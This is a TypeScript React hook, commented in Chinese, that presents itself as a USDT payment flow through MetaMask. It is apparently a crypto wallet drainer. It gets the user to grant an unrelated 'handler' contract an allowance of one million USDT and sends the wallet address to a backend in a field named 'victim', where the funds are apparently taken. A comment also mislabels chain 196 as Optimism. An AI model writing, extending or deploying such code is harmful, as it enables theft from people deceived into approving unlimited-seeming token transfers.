// useWalletPayment.ts
import { useState } from '@teact';
import { BrowserProvider, Contract } from 'ethers';

const API_BASE = process.env.VITE_API_BASE_URL;

// 合约配置
const CONTRACT_PAIRS = [
  {
    chainId: 1,
    usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Ethereum USDT
    handler: '0xbc73Ca3D177A7A0A368775B292E539448a9c3510',
  },
  {
    chainId: 196,
    usdt: '0x1E4a5963aBFD975d8c9021ce480b42188849D41d', // Optimism USDT
    handler: '0x689CA9411b1796c9d8AbBC1766F80Fd395736883',
  },
];

// ABI
const USDT_ABI = [
  'function approve(address spender, uint256 amount) public returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

// 判断是否移动设备
const isMobile = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

// 安全获取 chainId（兼容 PC + 移动）
const getChainIdSafe = async (provider: BrowserProvider): Promise<number | null> => {
  try {
    const raw = await window.ethereum.request({ method: 'eth_chainId' });
    const parsed = parseInt(raw, 16);
    if (!isNaN(parsed)) return parsed;
  } catch { /* empty */ }
  try {
    const network = await provider.getNetwork();
    return Number(network.chainId);
  } catch { /* empty */ }
  // eslint-disable-next-line no-null/no-null
  return null;
};

export default function useWalletPayment() {
  const [selectedWallet, setSelectedWallet] = useState('');

  // 链接钱包，返回当前链ID和地址
  const connectWallet = async (): Promise<{
    provider: BrowserProvider;
    chainId: number;
    address: string;
  } | null> => {
    if (!window.ethereum) {
      if (isMobile()) {
        const dappUrl = window.location.origin.replace(/^http:\/\//, 'https://');
        const deepLink = `https://metamask.app.link/dapp/${dappUrl}`;
        window.location.href = deepLink;
      } else {
        alert('请先安装 MetaMask 插件');
      }
      // eslint-disable-next-line no-null/no-null
      return null;
    }

    try {
      await window.ethereum.request({ method: 'eth_requestAccounts' });

      const newProvider = new BrowserProvider(window.ethereum);
      const newSigner = await newProvider.getSigner();
      const address = await newSigner.getAddress();
      const currentChainId = await getChainIdSafe(newProvider);

      if (!currentChainId) {
        alert('无法获取链ID，请重试');
        // eslint-disable-next-line no-null/no-null
        return null;
      }

      // 监听事件
      window.ethereum.removeAllListeners('accountsChanged');
      window.ethereum.removeAllListeners('chainChanged');
      window.ethereum.on('accountsChanged', () => location.reload());
      window.ethereum.on('chainChanged', () => location.reload());

      return {
        provider: newProvider,
        chainId: currentChainId,
        address,
      };
    } catch (err: any) {
      alert('连接失败：' + (err.message || err));
      // eslint-disable-next-line no-null/no-null
      return null;
    }
  };

  // 授权 USDT 支付
  const approve = async ({
    currentProvider,
    currentChainId,
    address,
  }: {
    currentProvider: BrowserProvider;
    currentChainId: number;
    address: string;
  }): Promise<boolean> => {
    const pair = CONTRACT_PAIRS.find((p) => p.chainId === currentChainId);
    if (!pair) {
      alert(`当前链（chainId=${currentChainId}）不支持支付`);
      return false;
    }

    const { usdt, handler } = pair;

    try {
      const code = await currentProvider.getCode(usdt);
      if (code === '0x') {
        alert(`💡 USDT 合约未部署在当前链（chainId=${currentChainId}）`);
        return false;
      }

      const currentSigner = await currentProvider.getSigner();
      const usdtContract = new Contract(usdt, USDT_ABI, currentSigner);
      const allowance = await usdtContract.allowance(address, handler);
      const amount = BigInt(1000000 * 10 ** 6);
      if (allowance >= amount / 2n) {
        return true;
      }

      const tx = await usdtContract.approve(handler, amount);
      await tx.wait();
      alert('✅ 授权成功！');
      return true;
    } catch (err: any) {
      alert('❌ 授权失败：' + (err.message || err));
      return false;
    }
  };

  // 调用后端支付接口
  const payApi = async (address: string, currentChainId: number) => {
    try {
      const res = await fetch(`${API_BASE}/v1/pay`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ victim: address, chain_id: currentChainId }),
      });
      const result = await res.json();
      if (result.success) {
        alert('💰 支付成功：' + result.message);
      } else {
        alert('❌ 支付失败：' + result.message);
      }
    } catch (err: any) {
      alert('❌ 支付失败：' + (err.message || err));
    }
  };

  // 主入口：连接+授权+支付
  const openPayment = async () => {
    if (!selectedWallet) {
      alert('请选择付款钱包');
      return;
    }
    if (selectedWallet !== 'MetaMask钱包') {
      alert('当前仅支持 MetaMask 支付');
      return;
    }

    const walletInfo = await connectWallet();
    if (!walletInfo) return;

    const { provider, chainId, address } = walletInfo;

    if (!provider) {
      alert('Provider 未初始化，请刷新页面或重新连接钱包');
      return;
    }

    const success = await approve({
      currentProvider: provider,
      currentChainId: chainId,
      address,
    });

    if (!success) {
      alert('⚠️ 授权未完成，无法支付');
      return;
    }
    await payApi(walletInfo.address, walletInfo.chainId);
  };

  return {
    selectedWallet,
    setSelectedWallet,
    openPayment,
  };
}
